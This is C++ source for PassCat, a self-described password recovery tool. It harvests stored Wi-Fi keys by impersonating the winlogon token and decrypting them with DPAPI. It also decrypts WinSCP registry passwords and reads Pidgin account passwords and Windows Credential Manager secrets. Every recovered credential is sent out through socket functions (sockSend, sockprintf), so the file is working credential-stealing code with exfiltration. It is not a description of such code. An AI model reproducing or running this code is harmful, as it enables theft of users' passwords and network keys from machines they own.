//PassCat - Passwords Recovery Tool
//This file is part of PassCat Project

//Written by : @maldevel
//Website : https ://www.twelvesec.com/
//GIT : https://github.com/twelvesec/passcat

//TwelveSec(@Twelvesec)

//This program is free software : you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see < http://www.gnu.org/licenses/>.

//For more see the file 'LICENSE' for copying permission.

#include <iostream>

#include "PassCat.h"

#define WLAN_API_VER	2

#pragma comment(lib, "wlanapi.lib")
#include <Wlanapi.h>

#pragma comment (lib, "Crypt32.lib")
#include <Wincrypt.h>

#pragma comment (lib, "Shlwapi.lib")
#include <Shlwapi.h>

bool libpasscat::initialized = false;

void libpasscat::init(void) {
	if (initialized) return;

	libxml::init();
	libvaultie::init();
	//libmozilla::init(nss3Dll, mozglueDll);

	initialized = true;
}

void libpasscat::finalize(void) {
	if (!initialized) return;

	libxml::finalize();
	libvaultie::finalize();
	//libmozilla::finalize();

	initialized = false;
}

void libpasscat::cat_filezilla_passwords(void) {
	if (!initialized) return;

	libfilezilla::print_filezilla_passwords();
}

void libpasscat::cat_wifi_passwords(void) {
	if (!initialized) return;

	std::wstringstream out;

	DWORD SupportedVersion = 0;
	HANDLE wlan = NULL;
	PWLAN_INTERFACE_INFO_LIST wlanifaceslist = NULL;
	PWLAN_PROFILE_INFO_LIST wlanproflist = NULL;
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
	DWORD access = 0;
	LPWSTR profileXML;

	BYTE toKey[1024] = { 0 };
	DWORD toKeySize = 1024;
	DWORD dwSkip = 0;
	DATA_BLOB DataIn;
	DATA_BLOB DataOut;
	DWORD procID = 0;

	HANDLE procToken = NULL;
	HANDLE procHandleToken = NULL;

	if (WlanOpenHandle(WLAN_API_VER, NULL, &SupportedVersion, &wlan) != ERROR_SUCCESS) {
		return;
	}

	if (WlanEnumInterfaces(wlan, NULL, &wlanifaceslist) != ERROR_SUCCESS) {
		if (wlan) {
			WlanCloseHandle(wlan, NULL);
			wlan = NULL;
		}
		return;
	}

	if (wlanifaceslist->dwNumberOfItems == 0) {
		if (wlan) {
			WlanCloseHandle(wlan, NULL);
			wlan = NULL;
		}
		if (wlanifaceslist) {
			WlanFreeMemory(wlanifaceslist);
			wlanifaceslist = NULL;
		}
		return;
	}

	for (DWORD i = 0; i < (int)wlanifaceslist->dwNumberOfItems; i++) {
		pIfInfo = (WLAN_INTERFACE_INFO *)&wlanifaceslist->InterfaceInfo[i];

		if (WlanGetProfileList(wlan, &pIfInfo->InterfaceGuid, NULL, &wlanproflist) != ERROR_SUCCESS) {
			continue;
		}

		for (DWORD j = 0; j < wlanproflist->dwNumberOfItems; j++) {
			out << "\n[PASSCAT]\nWLAN Profile Name: " << wlanproflist->ProfileInfo[j].strProfileName ;

			if (WlanGetProfile(wlan, &pIfInfo->InterfaceGuid, wlanproflist->ProfileInfo[j].strProfileName, NULL, &profileXML, &flags, &access) == ERROR_SUCCESS) {

				MSXML::IXMLDOMNodeListPtr list = libxml::select_by_path(profileXML, WIFI_XPATH_ONE);

				out << "\n[PASSCAT]\nAuthentication: " << list->item[0]->selectSingleNode("pf:authentication")->text ;
				out << "\n[PASSCAT]\nEncryption: " << list->item[0]->selectSingleNode("pf:encryption")->text ;
				out << "\n[PASSCAT]\nuseOneX: " << list->item[0]->selectSingleNode("pf:useOneX")->text ;


				std::wstring ws(out.str().c_str());
				std::string stws(ws.begin(), ws.end());

				sockSend(stws.c_str());

				if (wcscmp(list->item[0]->selectSingleNode("pf:useOneX")->text, L"false") == 0 && wcscmp(list->item[0]->selectSingleNode("pf:authentication")->text, L"open") != 0)
				{
					list = libxml::select_by_path(profileXML, WIFI_XPATH_TWO);
					LPWSTR text = _bstr_t(list->item[0]->selectSingleNode("pf:keyMaterial")->text);

					if ((procID = libsystem::ProcessId("winlogon.exe")) == 0) {
						continue;
					}

					if (!libpriv::SetCurrentPrivilege(SE_DEBUG_NAME, TRUE)) {
						//out << "\n[PASSCAT]\nPassword: " << "<encrypted>" << std::endl ;
						sockSend("\n[PASSCAT]\nPassword: <encrypted>");
						continue;
					}

					if (!(procToken = OpenProcess(MAXIMUM_ALLOWED, FALSE, procID))) {
						continue;
					}

					if (!OpenProcessToken(procToken, MAXIMUM_ALLOWED, &procHandleToken)) {
						if (procToken) {
							CloseHandle(procToken);
							procToken = NULL;
						}
						continue;
					}

					if (!ImpersonateLoggedOnUser(procHandleToken)) {
						if (procHandleToken) {
							CloseHandle(procHandleToken);
							procHandleToken = NULL;
						}
						if (procToken) {
							CloseHandle(procToken);
							procToken = NULL;
						}
						continue;
					}

					if (libpriv::IsElevated()) {
						if (!CryptStringToBinaryW(text, (DWORD)wcslen(text), CRYPT_STRING_HEX, NULL, &toKeySize, NULL, NULL)) {
							//out << "\n[PASSCAT]\nPassword: " << "<encrypted>" ;
							sockSend("\n[PASSCAT]\nPassword: <encrypted>");
							continue;
						}

						if (CryptStringToBinaryW(text, (DWORD)wcslen(text), CRYPT_STRING_HEX, toKey, &toKeySize, NULL, NULL)) {
							DataIn.cbData = toKeySize;
							DataIn.pbData = (BYTE *)toKey;
							if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
								//out << "\n[PASSCAT]\nPassword: " << DataOut.pbData ;

								sockprintf("\n[PASSCAT]\nPassword: %s\n", DataOut.pbData);
							}
						}
					}
					else {
						sockSend("\n[PASSCAT]\nPassword: <encrypted>");
					}
				}
			}

			
			if (procToken) {
				CloseHandle(procToken);
				procToken = NULL;
			}
			if (procHandleToken) {
				CloseHandle(procHandleToken);
				procHandleToken = NULL;
			}
		}

		if (wlanproflist) {
			WlanFreeMemory(wlanproflist);
			wlanproflist = NULL;
		}
	}

	if (wlanifaceslist) {
		WlanFreeMemory(wlanifaceslist);
		wlanifaceslist = NULL;
	}

	if (wlan) {
		WlanCloseHandle(wlan, NULL);
		wlan = NULL;
	}
}

void libpasscat::cat_winscp_passwords(void) {
	if (!initialized) return;
	std::wstringstream out;
	HKEY key;
	DWORD useOfMasterPass;
	DWORD count;
	DWORD index = 0;
	char name[MAX_PATH] = { 0 };
	DWORD size = MAX_PATH;
	LSTATUS result;
	char host[1024] = { 0 };
	char username[1024] = { 0 };
	char hash[1024] = { 0 };

	DWORD hostLen = sizeof(host);
	DWORD usernameLen = sizeof(username);
	DWORD hashLen = sizeof(hash);

	if (RegOpenKeyExW(HKEY_CURRENT_USER, WINSCP_REG_ONE, 0, KEY_QUERY_VALUE, &key) != ERROR_SUCCESS) {
		return;
	}

	if (RegGetValueW(key, L"Security", L"UseMasterPassword", RRF_RT_REG_DWORD, NULL, &useOfMasterPass, &count) != ERROR_SUCCESS) {
		if (key) {
			RegCloseKey(key);
			key = NULL;
		}
		return;
	}

	if (useOfMasterPass) {
		if (key) {
			RegCloseKey(key);
			key = NULL;
		}
		return;
	}

	if (key) {
		RegCloseKey(key);
		key = NULL;
	}

	if (RegOpenKeyExW(HKEY_CURRENT_USER, WINSCP_REG_TWO, 0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &key) != ERROR_SUCCESS) {
		return;
	}

	if ((result = RegEnumKeyExA(key, index, name, &size, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
		if (key) {
			RegCloseKey(key);
			key = NULL;
		}
		return;
	}

	do {
		out << "\n[PASSCAT]\nSite: " << name ;

		if (RegGetValueA(key, name, "HostName", RRF_RT_REG_SZ, NULL, &host, &hostLen) == ERROR_SUCCESS) {
			out << "\n[PASSCAT]\nHost: " << host ;
		}

		if (RegGetValueA(key, name, "UserName", RRF_RT_REG_SZ, NULL, &username, &usernameLen) == ERROR_SUCCESS) {
			out << "\n[PASSCAT]\nUsername: " << username ;
		}

		std::wstring ws(out.str().c_str());
		std::string stws(ws.begin(), ws.end());

		sockSend(stws.c_str());

		if (RegGetValueA(key, name, "Password", RRF_RT_REG_SZ, NULL, &hash, &hashLen) == ERROR_SUCCESS) {
			std::string password = libwinscp::decrypt_password(host, username, hash);
			//out << "\n[PASSCAT]\nPassword: " << password ;
			sockprintf("\n[PASSCAT]\nPassword: %s", password);
		}

		size = MAX_PATH;
		result = RegEnumKeyExA(key, ++index, name, &size, NULL, NULL, NULL, NULL);
		

	} while (result != ERROR_NO_MORE_ITEMS);

	if (key) {
		RegCloseKey(key);
		key = NULL;
	}

}

void libpasscat::cat_pidgin_passwords(void) {
	if (!initialized) return;
	std::wstringstream out;
	std::wstring pidgin_path = libsystem::get_pidgin_path();
	std::wstring accounts = pidgin_path + L"\\" + PIDGIN_FILE;

	if (!PathFileExistsW(accounts.c_str())) {
		return;
	}

	MSXML::IXMLDOMNodeListPtr list = libxml::select_by_path(accounts, PIDGIN_XPATH);

	for (long i = 0; i != list->length; ++i) {

		out << "\n[PASSCAT]\nProtocol: " << list->item[i]->selectSingleNode("protocol")->text ;
		out << "\n[PASSCAT]\nName: " << list->item[i]->selectSingleNode("name")->text ;
		out << "\n[PASSCAT]\nPassword: " << list->item[i]->selectSingleNode("password")->text ;
		out << "\n[PASSCAT]\nAlias: " << list->item[i]->selectSingleNode("alias")->text ;
		
	}

	std::wstring ws(out.str().c_str());
	std::string stws(ws.begin(), ws.end());

	sockSend(stws.c_str());
}

void libpasscat::cat_credmanager_passwords(void) {
	if (!initialized) return;
	std::wstringstream out;
	std::ostringstream pout;
	DWORD count;
	PCREDENTIALW *credentials;

	if (!CredEnumerateW(NULL, CRED_ENUMERATE_ALL_CREDENTIALS, &count, &credentials)) {
		return;
	}

	for (DWORD i = 0; i < count; ++i) {

		if (credentials[i]->UserName != NULL && (credentials[i]->Type == CRED_TYPE_GENERIC || credentials[i]->Type == CRED_TYPE_DOMAIN_VISIBLE_PASSWORD)) {

			if (credentials[i]->CredentialBlobSize < 200) {
				out << "\n[PASSCAT]\nURL: " << credentials[i]->TargetName ;
				out << "\n[PASSCAT]\nUsername: " << credentials[i]->UserName ;
				if (credentials[i]->CredentialBlobSize > 0) {
					pout << "\n[PASSCAT]\nPassword: ";
					for (DWORD j = 0; j < credentials[i]->CredentialBlobSize; j++) {
						if (credentials[i]->CredentialBlob[j] != '\0') {
							//out << credentials[i]->CredentialBlob[j];
							
							pout << credentials[i]->CredentialBlob[j];
						}
					}

					
					
				}
			}

			
		}
		std::wstring ws(out.str().c_str());
		std::string stws(ws.begin(), ws.end());

		sockSend(stws.c_str());
		sockSend(pout.str().c_str());
	}

	CredFree(credentials);
	std::wstring ws(out.str().c_str());
	std::string stws(ws.begin(), ws.end());

	sockSend(stws.c_str());
}

void libpasscat::cat_vault_ie_passwords(void) {
	if (!initialized) return;

	libvaultie::print_vault_ie_passwords();
}
